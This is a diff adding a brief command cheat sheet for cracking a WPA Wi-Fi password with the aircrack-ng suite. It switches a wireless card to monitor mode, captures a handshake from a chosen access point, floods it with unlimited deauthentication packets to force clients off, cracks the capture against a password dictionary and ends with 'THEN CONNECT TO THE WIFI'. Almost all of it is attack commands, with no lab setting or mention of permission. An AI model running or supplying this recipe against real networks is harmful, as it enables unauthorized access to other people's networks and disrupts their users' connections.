@@ -1,0 +1,35 @@
+ifconfig wlan0
+
+airmon-ng start wlan0
+
+ifconfig
+
+airodump-ng wlan0mon
+
+airodump-ng -c <CH> --bssid <bssid> -w /root/Desktop/handshake wlan0mon
+
+
+[IN ANOTHER TERMINAL]
+
+
+aireplay-ng -0 0 -a <bssid> wlan0mon
+
+
+[IF HANDSHAKE IS DONE NEXT FOLLOW]
+
+
+close all terminals
+
+aircrack-ng -w <drag your password dictionary file in .txt format> <drag created handshake file in .cap format>
+
+
+[TO START CONNECTING WIFI]
+
+
+service network-manager start
+
+airmon-ng stop wlan0mon
+
+
+[THEN CONNECT TO THE WIFI]
+
